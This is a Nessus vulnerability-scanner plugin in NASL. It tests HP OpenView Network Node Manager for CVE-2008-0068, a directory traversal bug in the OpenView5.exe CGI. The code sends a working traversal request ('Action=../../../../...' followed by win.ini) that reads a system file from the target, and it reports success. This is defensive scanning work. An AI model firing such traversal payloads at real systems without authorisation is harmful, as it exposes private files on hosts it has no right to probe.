#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(31860);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2008-0068");
  script_bugtraq_id(28745);
  script_osvdb_id(44359);
  script_xref(name:"Secunia", value:"29796");

  script_name(english:"HP OpenView Network Node Manager OpenView5.exe Action Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file with NNM");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is prone to a
directory traversal attack." );
 script_set_attribute(attribute:"description", value:
"The version of HP OpenView Network Node Manager installed on the
remote host fails to completely sanitize user input to the 'Action'
parameter of the 'OpenView5.exe' CGI script.  Using a value with
directory traversal sequences containing slashes rather than
backslashes, an unauthenticated, remote attacker can exploit this issue
to view arbitrary files on the remote host, subject to the privileges
under which the web server operates." );
 script_set_attribute(attribute:"see_also", value:"http://aluigi.altervista.org/adv/closedviewx-adv.txt" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/490771/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://secunia.com/secunia_research/2008-4/advisory/" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/490834/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2008/Jul/54" );
 script_set_attribute(attribute:"solution", value:
"Apply the appropriate patch / archive file as discussed in the vendor
advisory above." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(22);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/04/15");
 script_cvs_date("$Date: 2016/11/02 14:37:07 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl", "web_traversal.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 3443);

  exit(0);
}


# Only Windows is tested.
os = get_kb_item("Host/OS");
if (!os || "Windows" >!< os) exit(0);


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:3443, embedded: 0);
if ( get_kb_item(strcat("www/", port, "/generic_traversal"))) exit(0);



files = make_list(
  "/windows/win.ini",
  "/winnt/win.ini"
);


# Loop through directories.
dirs = list_uniq(make_list("/OvCgi", cgi_dirs()));

foreach dir (dirs)
{
  foreach file (files)
  {
    # Try to retrieve a local file.
    url = string(
      dir, "/OpenView5.exe?",
      "Target=Main&",
      "Action=../../../../../../../../../../", file
    );

    w = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
    res = w[2];

    # There's a problem if it looks like a win.ini file.
    if ("; for 16-bit app support" >< res)
    {
      if (report_verbosity)
      {
        exploit_url = build_url(port: port, qs: url);
        report = string(
          "\n",
          "Nessus was able to retrieve the contents of '", file, "'\n",
          "using the following URL :\n",
          "\n",
          "  ", exploit_url, "\n"
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here is the response :\n",
            "\n",
            res
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
}
